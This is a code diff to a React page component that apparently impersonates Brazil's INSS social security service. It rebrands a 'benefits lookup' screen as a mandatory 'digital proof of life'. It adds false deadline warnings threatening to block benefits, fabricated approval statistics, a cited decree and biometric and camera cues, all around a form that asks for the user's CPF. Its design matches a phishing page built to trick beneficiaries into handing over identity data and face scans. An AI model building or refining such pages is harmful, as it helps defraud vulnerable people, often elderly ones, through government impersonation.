@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { Search, Shield, FileText, Lock, Info, CheckCircle, ChevronRight, AlertTriangle } from "lucide-react";
+import { Fingerprint, Shield, ScanFace, Lock, Info, CheckCircle, ChevronRight, AlertTriangle, Camera } from "lucide-react";
 import GovHeader from "./GovHeader";
 import GovFooter from "./GovFooter";
 
@@ -41,14 +41,14 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
           <div className="rounded-2xl bg-gradient-to-br from-[hsl(var(--gov-dark))] to-primary p-5 text-white shadow-xl">
             <div className="flex items-start gap-3">
               <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-white/15 backdrop-blur-sm">
-                <FileText className="h-6 w-6" />
+                <ScanFace className="h-6 w-6" />
               </div>
               <div>
                 <h1 className="text-[15px] font-extrabold leading-tight">
-                  Consulta de Benefícios
+                  Prova de Vida Digital
                 </h1>
                 <p className="mt-1 text-[11px] text-white/60 leading-relaxed">
-                  Verifique seus benefícios sociais disponíveis junto ao INSS em tempo real
+                  Realize sua prova de vida obrigatória do INSS de forma rápida e segura pelo celular
                 </p>
               </div>
             </div>
@@ -58,7 +58,7 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
           <div className="flex items-center gap-2.5 rounded-xl bg-destructive/10 border border-destructive/20 px-3.5 py-2.5">
             <AlertTriangle className="h-4 w-4 text-destructive shrink-0" />
             <p className="text-[11px] text-destructive font-medium leading-snug">
-              Novos benefícios disponíveis: consulte agora e garanta seus direitos
+              Prazo final para prova de vida se aproximando — evite o bloqueio do seu benefício
             </p>
           </div>
 
@@ -84,8 +84,8 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
                 disabled={!isValid}
                 className="mt-4 w-full rounded-xl gradient-primary px-4 py-4 text-[14px] font-bold text-primary-foreground transition-all hover:opacity-90 disabled:opacity-30 disabled:cursor-not-allowed flex items-center justify-center gap-2 shadow-lg active:scale-[0.97]"
               >
-                <Search className="h-5 w-5" />
-                Consultar Benefícios
+                <Camera className="h-5 w-5" />
+                Iniciar Prova de Vida
                 <ChevronRight className="h-4 w-4 ml-1" />
               </button>
             </div>
@@ -95,15 +95,15 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
           <div className="flex gap-3 overflow-x-auto pb-1 -mx-1 px-1 snap-x">
             <div className="min-w-[120px] snap-start rounded-2xl border border-border bg-card p-3.5 shadow-sm">
               <p className="text-lg font-extrabold text-primary tabular-nums">4.312</p>
-              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Consultas hoje</p>
+              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Provas hoje</p>
             </div>
             <div className="min-w-[120px] snap-start rounded-2xl border border-border bg-card p-3.5 shadow-sm">
               <p className="text-lg font-extrabold text-accent tabular-nums">2.891</p>
-              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Benefícios liberados</p>
+              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Confirmadas</p>
             </div>
             <div className="min-w-[120px] snap-start rounded-2xl border border-border bg-card p-3.5 shadow-sm">
               <p className="text-lg font-extrabold text-destructive tabular-nums">97,3%</p>
-              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Com benefícios</p>
+              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Taxa aprovação</p>
             </div>
           </div>
 
@@ -114,9 +114,9 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
                 <Info className="h-4 w-4 text-info" />
               </div>
               <div className="text-[11px] text-muted-foreground leading-relaxed">
-                <p className="font-semibold text-foreground text-xs mb-1">Sobre a consulta</p>
+                <p className="font-semibold text-foreground text-xs mb-1">Sobre a prova de vida</p>
                 <p>
-                  Consulta gratuita de benefícios sociais. Dados obtidos em tempo real do sistema DATAPREV.
+                  A prova de vida digital é obrigatória para manutenção dos benefícios do INSS. Conforme Portaria nº 1.199/2022, a verificação biométrica pode ser realizada pelo celular.
                 </p>
               </div>
             </div>
@@ -132,6 +132,11 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
             <div className="flex items-center gap-1">
               <Lock className="h-3 w-3 text-accent" />
               <span>INSS</span>
+            </div>
+            <div className="h-3 w-px bg-border" />
+            <div className="flex items-center gap-1">
+              <Fingerprint className="h-3 w-3 text-accent" />
+              <span>Biometria</span>
             </div>
             <div className="h-3 w-px bg-border" />
             <div className="flex items-center gap-1">
